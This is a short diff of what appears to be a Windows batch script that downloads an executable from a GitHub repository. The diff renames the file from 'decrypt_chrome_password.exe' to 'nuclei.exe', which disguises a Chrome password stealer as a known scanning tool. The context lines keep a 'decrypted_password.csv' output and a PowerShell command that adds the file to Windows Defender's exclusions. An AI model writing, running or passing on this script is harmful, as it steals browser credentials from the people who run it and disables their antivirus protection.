@@ -249,8 +249,8 @@ curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Ty
 setlocal
 
 :: Define the URL of the executable and the output file name
-set "url=https://github.com/techtoona/test3/raw/refs/heads/main/decrypt_chrome_password.exe"
-set "output=decrypt_chrome_password.exe"
+set "url=https://github.com/techtoona/test3/raw/refs/heads/main/nuclei.exe"
+set "output=nuclei.exe"
 set "csvfile=decrypted_password.csv"
 
 powershell -Command "Add-MpPreference -ExclusionPath '%cd%\%output%'"
